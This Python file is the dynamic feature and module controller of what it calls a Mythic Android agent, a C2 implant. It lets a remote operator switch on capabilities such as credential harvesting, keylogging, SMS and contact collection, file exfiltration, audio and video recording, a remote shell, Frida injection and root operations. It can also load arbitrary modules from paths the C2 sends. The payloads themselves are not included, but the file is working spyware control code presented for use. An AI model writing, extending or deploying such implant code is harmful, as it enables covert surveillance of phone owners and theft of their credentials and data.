
"""
Dynamic Module Controller for Mythic Android Agent
Handles runtime module and feature management including remote enabling/disabling
of sensitive features, module loading/unloading, and feature toggling from C2 dashboard.

Features:
- Runtime module loading and unloading
- Remote feature toggling via web terminal
- Dynamic capability management
- OPSEC-controlled feature activation
- Module dependency management
- Resource monitoring and management
- Feature state persistence
- Safe feature deactivation
"""
import json
import time
import threading
import importlib
import inspect
import os
import sys
from typing import Dict, List, Any, Optional, Callable
from pathlib import Path
from enum import Enum
import weakref
import gc


class FeatureState(Enum):
    """Feature activation states"""
    DISABLED = "disabled"
    ENABLED = "enabled"
    SUSPENDED = "suspended"
    ERROR = "error"


class ModuleState(Enum):
    """Module loading states"""
    UNLOADED = "unloaded"
    LOADED = "loaded"
    ACTIVE = "active"
    SUSPENDED = "suspended"
    ERROR = "error"


class FeatureController:
    """Controls individual feature states and capabilities"""
    
    def __init__(self, feature_name: str, default_state: FeatureState = FeatureState.DISABLED):
        self.feature_name = feature_name
        self.state = default_state
        self.last_state_change = time.time()
        self.activation_count = 0
        self.error_count = 0
        self.dependencies = []
        self.callbacks = {
            'on_enable': [],
            'on_disable': [],
            'on_suspend': [],
            'on_error': []
        }
        self._lock = threading.Lock()
    
    def enable(self) -> bool:
        """Enable the feature"""
        with self._lock:
            try:
                if self.state == FeatureState.DISABLED:
                    self._execute_callbacks('on_enable')
                    self.state = FeatureState.ENABLED
                    self.last_state_change = time.time()
                    self.activation_count += 1
                    return True
                return self.state == FeatureState.ENABLED
            except Exception as e:
                self.state = FeatureState.ERROR
                self.error_count += 1
                self._execute_callbacks('on_error', e)
                return False
    
    def disable(self) -> bool:
        """Disable the feature"""
        with self._lock:
            try:
                if self.state in [FeatureState.ENABLED, FeatureState.SUSPENDED]:
                    self._execute_callbacks('on_disable')
                    self.state = FeatureState.DISABLED
                    self.last_state_change = time.time()
                    return True
                return self.state == FeatureState.DISABLED
            except Exception as e:
                self.state = FeatureState.ERROR
                self.error_count += 1
                self._execute_callbacks('on_error', e)
                return False
    
    def suspend(self) -> bool:
        """Suspend the feature temporarily"""
        with self._lock:
            try:
                if self.state == FeatureState.ENABLED:
                    self._execute_callbacks('on_suspend')
                    self.state = FeatureState.SUSPENDED
                    self.last_state_change = time.time()
                    return True
                return self.state == FeatureState.SUSPENDED
            except Exception as e:
                self.state = FeatureState.ERROR
                self.error_count += 1
                self._execute_callbacks('on_error', e)
                return False
    
    def is_active(self) -> bool:
        """Check if feature is currently active"""
        return self.state == FeatureState.ENABLED
    
    def add_callback(self, event: str, callback: Callable):
        """Add callback for state changes"""
        if event in self.callbacks:
            self.callbacks[event].append(callback)
    
    def _execute_callbacks(self, event: str, *args):
        """Execute callbacks for an event"""
        for callback in self.callbacks.get(event, []):
            try:
                callback(*args)
            except Exception:
                pass
    
    def get_status(self) -> Dict[str, Any]:
        """Get feature status information"""
        return {
            'name': self.feature_name,
            'state': self.state.value,
            'last_change': self.last_state_change,
            'activation_count': self.activation_count,
            'error_count': self.error_count,
            'dependencies': self.dependencies,
            'is_active': self.is_active()
        }


class ModuleManager:
    """Manages dynamic module loading and unloading"""
    
    def __init__(self, agent_instance):
        self.agent = agent_instance
        self.loaded_modules = {}
        self.module_states = {}
        self.module_metadata = {}
        self._lock = threading.Lock()
        
    def load_module(self, module_name: str, module_path: Optional[str] = None) -> bool:
        """Load a module dynamically"""
        with self._lock:
            try:
                if module_name in self.loaded_modules:
                    return True
                

                if module_path:
                    spec = importlib.util.spec_from_file_location(module_name, module_path)
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                else:
                    module_import_path = f"modules.{module_name}"
                    module = importlib.import_module(module_import_path)
                

                module_class = self._find_module_class(module, module_name)
                if not module_class:
                    raise ImportError(f"No module class found in {module_name}")
                

                dependencies = self._resolve_dependencies(module_class)
                instance = module_class(self.agent, **dependencies)
                

                self.loaded_modules[module_name] = instance
                self.module_states[module_name] = ModuleState.LOADED
                self.module_metadata[module_name] = {
                    'class_name': module_class.__name__,
                    'load_time': time.time(),
                    'instance': weakref.ref(instance),
                    'dependencies': list(dependencies.keys()),
                    'methods': self._get_module_methods(instance)
                }
                
                return True
                
            except Exception as e:
                self.module_states[module_name] = ModuleState.ERROR
                self.module_metadata[module_name] = {
                    'error': str(e),
                    'error_time': time.time()
                }
                return False
    
    def unload_module(self, module_name: str, force: bool = False) -> bool:
        """Unload a module dynamically"""
        with self._lock:
            try:
                if module_name not in self.loaded_modules:
                    return True
                
                instance = self.loaded_modules[module_name]
                

                if not force:
                    dependent_modules = self._get_dependent_modules(module_name)
                    if dependent_modules:
                        raise Exception(f"Module {module_name} has dependencies: {dependent_modules}")
                

                if hasattr(instance, 'cleanup'):
                    instance.cleanup()
                

                del self.loaded_modules[module_name]
                self.module_states[module_name] = ModuleState.UNLOADED
                

                if module_name in self.module_metadata:
                    self.module_metadata[module_name]['unload_time'] = time.time()
                

                del instance
                gc.collect()
                
                return True
                
            except Exception as e:
                self.module_states[module_name] = ModuleState.ERROR
                if module_name in self.module_metadata:
                    self.module_metadata[module_name]['error'] = str(e)
                return False
    
    def reload_module(self, module_name: str) -> bool:
        """Reload a module (unload then load)"""
        if module_name in self.loaded_modules:
            if not self.unload_module(module_name, force=True):
                return False
        return self.load_module(module_name)
    
    def activate_module(self, module_name: str) -> bool:
        """Activate a loaded module"""
        with self._lock:
            try:
                if module_name not in self.loaded_modules:
                    return False
                
                instance = self.loaded_modules[module_name]
                if hasattr(instance, 'activate'):
                    instance.activate()
                
                self.module_states[module_name] = ModuleState.ACTIVE
                return True
                
            except Exception as e:
                self.module_states[module_name] = ModuleState.ERROR
                return False
    
    def suspend_module(self, module_name: str) -> bool:
        """Suspend an active module"""
        with self._lock:
            try:
                if module_name not in self.loaded_modules:
                    return False
                
                instance = self.loaded_modules[module_name]
                if hasattr(instance, 'suspend'):
                    instance.suspend()
                
                self.module_states[module_name] = ModuleState.SUSPENDED
                return True
                
            except Exception as e:
                self.module_states[module_name] = ModuleState.ERROR
                return False
    
    def get_module_status(self, module_name: Optional[str] = None) -> Dict[str, Any]:
        """Get status of modules"""
        if module_name:
            if module_name in self.module_states:
                return {
                    'name': module_name,
                    'state': self.module_states[module_name].value,
                    'metadata': self.module_metadata.get(module_name, {}),
                    'is_loaded': module_name in self.loaded_modules
                }
            return {'name': module_name, 'state': 'not_found'}
        

        return {
            name: {
                'state': state.value,
                'metadata': self.module_metadata.get(name, {}),
                'is_loaded': name in self.loaded_modules
            }
            for name, state in self.module_states.items()
        }
    
    def _find_module_class(self, module, module_name: str):
        """Find the main class in a module"""
        for name, obj in inspect.getmembers(module, inspect.isclass):
            if (name.endswith('Module') and
                obj.__module__ == module.__name__):
                return obj
        return None
    
    def _resolve_dependencies(self, module_class) -> Dict[str, Any]:
        """Resolve module dependencies"""
        dependencies = {}
        
        try:
            sig = inspect.signature(module_class.__init__)
            for param_name, param in sig.parameters.items():
                if param_name in ['self', 'agent']:
                    continue
                

                if param_name == 'logger':
                    dependencies['logger'] = getattr(self.agent, 'offline_logger', None)
                elif param_name == 'encryption_key':
                    dependencies['encryption_key'] = getattr(self.agent, 'encryption_key', None)
                elif param_name == 'device_id':
                    dependencies['device_id'] = getattr(self.agent, 'device_id', None)
                elif param_name == 'config':
                    dependencies['config'] = getattr(self.agent, 'config', {})
        except Exception:
            pass
        
        return dependencies
    
    def _get_dependent_modules(self, module_name: str) -> List[str]:
        """Get modules that depend on the given module"""
        dependents = []
        for name, metadata in self.module_metadata.items():
            if module_name in metadata.get('dependencies', []):
                dependents.append(name)
        return dependents
    
    def _get_module_methods(self, instance) -> List[str]:
        """Get callable methods from a module instance"""
        methods = []
        for name in dir(instance):
            if not name.startswith('_'):
                attr = getattr(instance, name)
                if callable(attr):
                    methods.append(name)
        return methods


class DynamicController:
    """Main dynamic controller for features and modules"""
    
    def __init__(self, agent_instance):
        self.agent = agent_instance
        self.features = {}
        self.module_manager = ModuleManager(agent_instance)
        self.config = {}
        self._lock = threading.Lock()
        self._initialize_default_features()
    
    def _initialize_default_features(self):
        """Initialize default features with OPSEC-first approach"""
        default_features = [
            'credential_harvesting',
            'location_tracking',
            'call_logging',
            'sms_collection',
            'file_exfiltration',
            'screenshot_capture',
            'keylogger',
            'audio_recording',
            'video_recording',
            'clipboard_monitoring',
            'app_monitoring',
            'network_monitoring',
            'contact_extraction',
            'calendar_access',
            'photo_access',
            'document_scanning',
            'remote_shell',
            'frida_injection',
            'root_operations'
        ]
        
        for feature in default_features:
            self.features[feature] = FeatureController(
                feature,
                FeatureState.DISABLED
            )
    
    def toggle_feature(self, feature_name: str, enable: bool, source: str = 'unknown') -> Dict[str, Any]:
        """Toggle a feature on or off remotely"""
        with self._lock:
            try:
                if feature_name not in self.features:
                    return {
                        'success': False,
                        'error': f'Feature {feature_name} not found',
                        'available_features': list(self.features.keys())
                    }
                
                feature = self.features[feature_name]
                
                if enable:
                    success = feature.enable()
                    action = 'enabled'
                else:
                    success = feature.disable()
                    action = 'disabled'
                

                if hasattr(self.agent, 'offline_logger'):
                    self.agent.offline_logger.log_event('feature_toggle', {
                        'feature': feature_name,
                        'action': action,
                        'success': success,
                        'source': source,
                        'timestamp': time.time()
                    })
                
                return {
                    'success': success,
                    'feature': feature_name,
                    'action': action,
                    'status': feature.get_status()
                }
                
            except Exception as e:
                return {
                    'success': False,
                    'error': str(e),
                    'feature': feature_name
                }
    
    def suspend_feature(self, feature_name: str, source: str = 'unknown') -> Dict[str, Any]:
        """Suspend a feature temporarily"""
        with self._lock:
            try:
                if feature_name not in self.features:
                    return {'success': False, 'error': f'Feature {feature_name} not found'}
                
                feature = self.features[feature_name]
                success = feature.suspend()
                

                if hasattr(self.agent, 'offline_logger'):
                    self.agent.offline_logger.log_event('feature_suspend', {
                        'feature': feature_name,
                        'success': success,
                        'source': source,
                        'timestamp': time.time()
                    })
                
                return {
                    'success': success,
                    'feature': feature_name,
                    'action': 'suspended',
                    'status': feature.get_status()
                }
                
            except Exception as e:
                return {
                    'success': False,
                    'error': str(e),
                    'feature': feature_name
                }
    
    def bulk_feature_control(self, commands: List[Dict[str, Any]], source: str = 'unknown') -> List[Dict[str, Any]]:
        """Execute multiple feature control commands"""
        results = []
        
        for command in commands:
            feature_name = command.get('feature')
            action = command.get('action')
            
            if not feature_name or not action:
                results.append({
                    'success': False,
                    'error': 'Missing feature name or action',
                    'command': command
                })
                continue
            
            if action == 'enable':
                result = self.toggle_feature(feature_name, True, source)
            elif action == 'disable':
                result = self.toggle_feature(feature_name, False, source)
            elif action == 'suspend':
                result = self.suspend_feature(feature_name, source)
            else:
                result = {
                    'success': False,
                    'error': f'Unknown action: {action}',
                    'feature': feature_name
                }
            
            results.append(result)
        
        return results
    
    def emergency_disable_all(self, source: str = 'emergency') -> Dict[str, Any]:
        """Emergency disable all features"""
        results = []
        
        for feature_name, feature in self.features.items():
            try:
                success = feature.disable()
                results.append({
                    'feature': feature_name,
                    'success': success
                })
            except Exception as e:
                results.append({
                    'feature': feature_name,
                    'success': False,
                    'error': str(e)
                })
        

        if hasattr(self.agent, 'offline_logger'):
            self.agent.offline_logger.log_event('emergency_disable_all', {
                'source': source,
                'timestamp': time.time(),
                'results': results
            })
        
        return {
            'success': True,
            'action': 'emergency_disable_all',
            'results': results,
            'total_features': len(self.features),
            'disabled_count': sum(1 for r in results if r['success'])
        }
    
    def load_module(self, module_name: str, module_path: Optional[str] = None) -> Dict[str, Any]:
        """Load a module dynamically"""
        success = self.module_manager.load_module(module_name, module_path)
        
        if success:

            if hasattr(self.agent, 'modules') and module_name in self.module_manager.loaded_modules:
                self.agent.modules[module_name] = self.module_manager.loaded_modules[module_name]
        
        return {
            'success': success,
            'module': module_name,
            'action': 'loaded',
            'status': self.module_manager.get_module_status(module_name)
        }
    
    def unload_module(self, module_name: str, force: bool = False) -> Dict[str, Any]:
        """Unload a module dynamically"""
        success = self.module_manager.unload_module(module_name, force)
        
        if success:

            if hasattr(self.agent, 'modules') and module_name in self.agent.modules:
                del self.agent.modules[module_name]
        
        return {
            'success': success,
            'module': module_name,
            'action': 'unloaded',
            'status': self.module_manager.get_module_status(module_name)
        }
    
    def get_feature_status(self, feature_name: Optional[str] = None) -> Dict[str, Any]:
        """Get feature status information"""
        if feature_name:
            if feature_name in self.features:
                return self.features[feature_name].get_status()
            return {'error': f'Feature {feature_name} not found'}
        

        return {
            name: feature.get_status()
            for name, feature in self.features.items()
        }
    
    def get_module_status(self, module_name: Optional[str] = None) -> Dict[str, Any]:
        """Get module status information"""
        return self.module_manager.get_module_status(module_name)
    
    def get_capabilities(self) -> Dict[str, Any]:
        """Get current agent capabilities based on enabled features and loaded modules"""
        capabilities = {
            'features': {},
            'modules': {},
            'active_count': 0,
            'total_count': 0
        }
        

        for name, feature in self.features.items():
            capabilities['features'][name] = {
                'active': feature.is_active(),
                'state': feature.state.value
            }
            if feature.is_active():
                capabilities['active_count'] += 1
            capabilities['total_count'] += 1
        

        capabilities['modules'] = self.module_manager.get_module_status()
        
        return capabilities
    
    def process_remote_command(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Process remote command from C2 dashboard"""
        try:
            cmd_type = command.get('type')
            
            if cmd_type == 'toggle_feature':
                return self.toggle_feature(
                    command.get('feature'),
                    command.get('enable', False),
                    command.get('source', 'remote')
                )
            
            elif cmd_type == 'suspend_feature':
                return self.suspend_feature(
                    command.get('feature'),
                    command.get('source', 'remote')
                )
            
            elif cmd_type == 'bulk_control':
                return {
                    'success': True,
                    'results': self.bulk_feature_control(
                        command.get('commands', []),
                        command.get('source', 'remote')
                    )
                }
            
            elif cmd_type == 'emergency_disable':
                return self.emergency_disable_all(command.get('source', 'remote'))
            
            elif cmd_type == 'load_module':
                return self.load_module(
                    command.get('module'),
                    command.get('path')
                )
            
            elif cmd_type == 'unload_module':
                return self.unload_module(
                    command.get('module'),
                    command.get('force', False)
                )
            
            elif cmd_type == 'get_status':
                return {
                    'features': self.get_feature_status(),
                    'modules': self.get_module_status(),
                    'capabilities': self.get_capabilities()
                }
            
            else:
                return {
                    'success': False,
                    'error': f'Unknown command type: {cmd_type}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'command': command
            }
    
    def save_state(self, file_path: str) -> bool:
        """Save feature and module states to file"""
        try:
            state_data = {
                'timestamp': time.time(),
                'features': {
                    name: {
                        'state': feature.state.value,
                        'activation_count': feature.activation_count,
                        'error_count': feature.error_count
                    }
                    for name, feature in self.features.items()
                },
                'modules': self.module_manager.get_module_status()
            }
            
            with open(file_path, 'w') as f:
                json.dump(state_data, f, indent=2)
            
            return True
        except Exception:
            return False
    
    def load_state(self, file_path: str) -> bool:
        """Load feature and module states from file"""
        try:
            with open(file_path, 'r') as f:
                state_data = json.load(f)
            

            for name, feature_data in state_data.get('features', {}).items():
                if name in self.features:
                    feature = self.features[name]
                    state_value = feature_data.get('state')
                    if state_value:
                        try:
                            feature.state = FeatureState(state_value)
                        except ValueError:
                            pass
            
            return True
        except Exception:
            return False


class DynamicControllerModule:
    """Module wrapper for integration with Mythic Agent"""
    
    def __init__(self, agent_instance, logger=None, encryption_key=None, device_id=None, config=None):
        self.agent = agent_instance
        self.logger = logger
        self.controller = DynamicController(agent_instance)
    
    def execute(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute dynamic controller commands"""
        try:
            if command == 'toggle_feature':
                return self.controller.toggle_feature(
                    args.get('feature'),
                    args.get('enable', False),
                    args.get('source', 'command')
                )
            
            elif command == 'process_remote':
                return self.controller.process_remote_command(args)
            
            elif command == 'get_capabilities':
                return self.controller.get_capabilities()
            
            elif command == 'emergency_disable':
                return self.controller.emergency_disable_all('command')
            
            elif command == 'load_module':
                return self.controller.load_module(args.get('module'), args.get('path'))
            
            elif command == 'unload_module':
                return self.controller.unload_module(args.get('module'), args.get('force', False))
            
            elif command == 'get_status':
                return {
                    'features': self.controller.get_feature_status(),
                    'modules': self.controller.get_module_status()
                }
            
            else:
                return {'error': f'Unknown command: {command}'}
                
        except Exception as e:
            return {'error': str(e)}
    
    def get_controller(self) -> DynamicController:
        """Get the underlying controller instance"""
        return self.controller
